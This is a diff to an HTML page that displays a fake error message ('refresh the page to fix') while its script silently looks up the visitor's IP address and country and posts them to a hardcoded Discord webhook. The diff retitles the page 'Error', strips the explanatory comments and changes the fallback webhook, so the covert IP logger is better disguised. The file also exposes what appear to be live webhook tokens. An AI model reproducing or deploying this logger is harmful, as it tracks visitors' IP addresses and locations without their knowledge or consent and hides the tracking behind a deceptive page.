@@ -3,33 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>#️⃣RR</title>
+    <title>Error</title>
 </head>
 <body>
 
 <h3>If you see this then refresh the page to fix, if it keeps on repeating please contact the owner.</h3>
 
 <script>
-    // Function to get country flag emoji based on country code
     function getFlagEmoji(countryCode) {
         const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
         return String.fromCodePoint(...codePoints);
     }
 
-    // Get the visitor's IP address and country
     fetch('https://api64.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             const ipAddress = data.ip;
 
-            // Fetch country information
             fetch(`https://ipapi.co/${ipAddress}/json/`)
                 .then(response => response.json())
                 .then(countryData => {
                     const country = countryData.country_name || 'Unknown';
                     const countryCode = countryData.country || 'N/A';
 
-                    // Send IP and country information to Discord webhook
                     const webhookUrl = 'https://discord.com/api/webhooks/1221826422616625182/FgixyJO2e1A4xGZIQasrA-xJHDzi0HwVvxehOySWzi9HlyWvyONdPlmHODWzqwCp_rEa';
                     const message = `Visitor IP: ${ipAddress}\nCountry: ${country} ${getFlagEmoji(countryCode)}`;
 
@@ -42,8 +38,7 @@
                     });
                 })
                 .catch(() => {
-                    // Handle errors when fetching country information
-                    const webhookUrl = 'https://discord.com/api/webhooks/1216837087039328266/YzgHgAGktUVp-RIoF6mgscDxEoKDxlTQYgyxl4dw17c_AgWRMaHsiQqFk-yxP6BvFknb';
+                    const webhookUrl = 'https://discord.com/api/webhooks/1221826422616625182/FgixyJO2e1A4xGZIQasrA-xJHDzi0HwVvxehOySWzi9HlyWvyONdPlmHODWzqwCp_rEa';
                     const errorMessage = 'Couldn\'t fetch country information';
                     
                     fetch(webhookUrl, {
